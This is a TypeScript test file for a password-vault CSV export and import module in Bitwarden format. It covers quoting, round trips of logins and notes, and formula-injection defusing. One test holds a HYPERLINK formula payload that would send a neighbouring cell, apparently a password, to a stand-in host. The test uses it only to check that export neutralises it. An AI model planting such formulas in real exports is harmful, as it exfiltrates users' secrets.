import assert from "node:assert/strict";
import { test } from "node:test";
import { csvToExport, itemsToCsv, parseCsv } from "./csv.ts";

test("csv: quotes, doubled quotes, line breaks and CRLF", () => {
  assert.deepEqual(parseCsv('a,"b,c","d ""e""\nf"\r\n1,,3\n'), [["a", "b,c", 'd "e"\nf'], ["1", "", "3"]]);
  assert.deepEqual(parseCsv("﻿x,y"), [["x", "y"]]);
});

test("csv: Bitwarden export and import round-trip logins and notes", () => {
  const items = [
    { type: 1, name: "Mail, work", folderId: "f1", favorite: true, reprompt: 1, notes: 'say "hi"', fields: [{ name: "pin", value: "12: 34", type: 1 }], login: { username: "u", password: "p,w", totp: "otpauth://x", uris: [{ uri: "https://a.test" }, { uri: "b.test" }] } },
    { type: 2, name: "Note", folderId: null, notes: "line1\nline2", secureNote: { type: 0 } },
    { type: 3, name: "Card" },
  ];
  const { csv, skipped } = itemsToCsv(items, (id) => (id === "f1" ? "Work" : ""));
  assert.equal(skipped, 1);
  const back = csvToExport(csv);
  assert.deepEqual(back.folders, [{ id: "0", name: "Work" }]);
  assert.equal(back.items.length, 2);
  const [login, note] = back.items as Record<string, any>[];
  assert.equal(login.name, "Mail, work");
  assert.equal(login.folderId, "0");
  assert.equal(login.favorite, true);
  assert.equal(login.reprompt, 1);
  assert.equal(login.notes, 'say "hi"');
  assert.deepEqual(login.fields, [{ name: "pin", value: "12: 34", type: 0 }]);
  assert.deepEqual(login.login, { username: "u", password: "p,w", totp: "otpauth://x", uris: [{ uri: "https://a.test", match: null }, { uri: "b.test", match: null }] });
  assert.equal(note.type, 2);
  assert.equal(note.notes, "line1\nline2");
  assert.throws(() => csvToExport("a,b\n1,2"));
});

test("csv: a formula-looking username is defused on export and restored on import; other cells stay as typed", () => {
  const evil = '=HYPERLINK("http://127.0.0.1:9/?"&J3,"x")';
  const items = [{ type: 1, name: "a.test", notes: "- milk", login: { username: evil, password: "=p@ss", totp: "", uris: [] } }];
  const { csv } = itemsToCsv(items, () => "");
  const row = parseCsv(csv)[1]!;
  assert.equal(row[8], `'${evil}`);
  assert.equal(row[4], "- milk");
  assert.equal(row[9], "=p@ss");
  const [login] = csvToExport(csv).items as Record<string, any>[];
  assert.equal(login.login.username, evil);
  assert.equal(login.notes, "- milk");
  assert.equal(login.login.password, "=p@ss");
  // A username that already starts with ' and a formula character survives the round trip.
  const [kept] = csvToExport(itemsToCsv([{ type: 1, name: "b", login: { username: "'=x" } }], () => "").csv).items as Record<string, any>[];
  assert.equal(kept.login.username, "'=x");
  // The name too: a passkey item is named by the site (rp.name).
  const named = itemsToCsv([{ type: 1, name: evil, login: {} }], () => "").csv;
  assert.equal(parseCsv(named)[1]![3], `'${evil}`);
  assert.equal(csvToExport(named).items[0]!.name, evil);
});
